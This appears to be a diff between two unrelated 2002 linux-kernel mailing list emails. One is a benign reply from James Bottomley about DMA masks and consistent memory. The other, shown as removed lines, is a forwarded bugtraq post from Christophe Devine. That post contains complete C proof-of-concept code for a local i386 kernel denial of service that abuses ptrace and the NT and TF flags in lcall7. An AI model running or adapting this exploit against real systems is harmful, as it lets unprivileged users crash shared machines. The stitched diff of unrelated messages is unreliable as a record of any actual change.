@@ -1,97 +1,51 @@
 Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id <S263313AbSKMUQn>; Wed, 13 Nov 2002 15:16:43 -0500
+	id <S263256AbSKMUOe>; Wed, 13 Nov 2002 15:14:34 -0500
 Received: (majordomo@vger.kernel.org) by vger.kernel.org
-	id <S263310AbSKMUQm>; Wed, 13 Nov 2002 15:16:42 -0500
-Received: from daytona.gci.com ([205.140.80.57]:57106 "EHLO daytona.gci.com")
-	by vger.kernel.org with ESMTP id <S263291AbSKMUQj>;
-	Wed, 13 Nov 2002 15:16:39 -0500
-Message-ID: <BF9651D8732ED311A61D00105A9CA3150B45FBB0@berkeley.gci.com>
-From: Leif Sawyer <lsawyer@gci.com>
-To: Alan Cox <alan@lxorguk.ukuu.org.uk>, Christoph Hellwig <hch@infradead.org>
-Cc: Linux Kernel Mailing List <linux-kernel@vger.kernel.org>
-Subject: RE: FW: i386 Linux kernel DoS (clarification)
-Date: Wed, 13 Nov 2002 11:23:15 -0900
-MIME-Version: 1.0
-X-Mailer: Internet Mail Service (5.5.2656.59)
-Content-Type: text/plain;
-	charset="iso-8859-1"
+	id <S263276AbSKMUOe>; Wed, 13 Nov 2002 15:14:34 -0500
+Received: from host194.steeleye.com ([66.206.164.34]:34323 "EHLO
+	pogo.mtv1.steeleye.com") by vger.kernel.org with ESMTP
+	id <S263256AbSKMUOd>; Wed, 13 Nov 2002 15:14:33 -0500
+Message-Id: <200211132021.gADKL8r02349@localhost.localdomain>
+X-Mailer: exmh version 2.4 06/23/2000 with nmh-1.0.4
+To: Grant Grundler <grundler@dsl2.external.hp.com>
+cc: Miles Bader <miles@gnu.org>, Greg KH <greg@kroah.com>,
+       "J.E.J. Bottomley" <James.Bottomley@SteelEye.com>,
+       Matthew Wilcox <willy@debian.org>,
+       "Adam J. Richter" <adam@yggdrasil.com>, andmike@us.ibm.com, hch@lst.de,
+       linux-kernel@vger.kernel.org, mochel@osdl.org,
+       parisc-linux@lists.parisc-linux.org
+Subject: Re: [parisc-linux] Untested port of parisc_device to generic device 
+ interface
+In-Reply-To: Message from Grant Grundler <grundler@dsl2.external.hp.com> 
+   of "Wed, 13 Nov 2002 13:13:57 MST." <20021113201357.5302F4829@dsl2.external.hp.com> 
+Mime-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Date: Wed, 13 Nov 2002 15:21:07 -0500
+From: "J.E.J. Bottomley" <James.Bottomley@steeleye.com>
+X-AntiVirus: scanned for viruses by AMaViS 0.2.1 (http://amavis.org/)
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-Here's a little clarification on the problem:
+Miles Bader wrote:
+> I can't speak for `real machines,' but on my wierd embedded board,
+> pci_alloc_consistent allocates from a special area of memory (not
+> located at 0) that is the only shared memory between PCI devices and the
+> CPU.  pci_alloc_consistent happens to fit this situation quite well, but
+> I don't think a bitmask is enough to express the situation.
 
-On Wed, 13 Nov 2002, Stefan Laudat wrote:
+grundler@dsl2.external.hp.com said:
+> HP PARISC V-Class do that as well. The "consistent" memory lives on
+> the PCI Bus Controller - not in host mem. Note that parisc-linux does
+> not (yet) support V-class. 
 
-> Regarding this issue: is it 80x86 or specifically 80386 designed ?
-> Been trying it on AMD Duron, AMD Athlon MP, Intel i586 - just segfaults :(
+Actually, I think dma_mask and consistent memory are orthogonal problems.  
+dma_masks are used by the I/O subsystem to determine whether direct DMA to a 
+memory region containing an I/O buffer is possible or whether it has to be 
+bounced.  Consistent memory is usually allocated for driver specific 
+transfers.  The I/O subsystem doesn't usually require the actual I/O buffers 
+to be in consistent memory.
 
-Yep; the first version of the DoS I posted on bugtraq was defective and
-worked only under special conditions (inside gdb for example).
+James
 
-However this updated version works much better:
 
-#include <sys/ptrace.h>
-
-struct user_regs_struct {
-        long ebx, ecx, edx, esi, edi, ebp, eax;
-        unsigned short ds, __ds, es, __es;
-        unsigned short fs, __fs, gs, __gs;
-        long orig_eax, eip;
-        unsigned short cs, __cs;
-        long eflags, esp;
-        unsigned short ss, __ss;
-};
-
-int main( void )
-{
-    int pid;
-    char dos[] = "\x9A\x00\x00\x00\x00\x07\x00";
-    void (* lcall7)( void ) = (void *) dos;
-    struct user_regs_struct d;
-
-    if( ! ( pid = fork() ) )
-    {
-        usleep( 1000 );
-        (* lcall7)();
-    }
-    else
-    {
-        ptrace( PTRACE_ATTACH, pid, 0, 0 );
-        while( 1 )
-        {
-            wait( 0 );
-            ptrace( PTRACE_GETREGS, pid, 0, &d );
-            d.eflags |= 0x4100; /* set TF and NT */
-            ptrace( PTRACE_SETREGS, pid, 0, &d );
-            ptrace( PTRACE_SYSCALL, pid, 0, 0 );
-        }
-    }
-
-    return 1;
-}
-
-At the beginning I thought only kernels <= 2.4.18 were affected; but it
-appeared that both kernels 2.4.19 and 2.4.20-rc1 are vulnerable as well.
-The flaw seems to be related to the kernel's handling of the nested task 
-(NT) flag inside a lcall7. 
-
--- 
-Christophe Devine
-
-> -----Original Message-----
-> From: Alan Cox [mailto:alan@lxorguk.ukuu.org.uk]
-> Sent: Tuesday, November 12, 2002 3:10 PM
-> To: Christoph Hellwig
-> Cc: Leif Sawyer; Linux Kernel Mailing List
-> Subject: Re: FW: i386 Linux kernel DoS
-> 
-> 
-> On Tue, 2002-11-12 at 23:31, Christoph Hellwig wrote:
-> > On Tue, Nov 12, 2002 at 02:28:55PM -0900, Leif Sawyer wrote:
-> > > This was posted on bugtraq today...
-> > 
-> > A real segfaulting program?  wow :)
-> 
-> Looks like the TF handling bug which was fixed a while ago
-> 
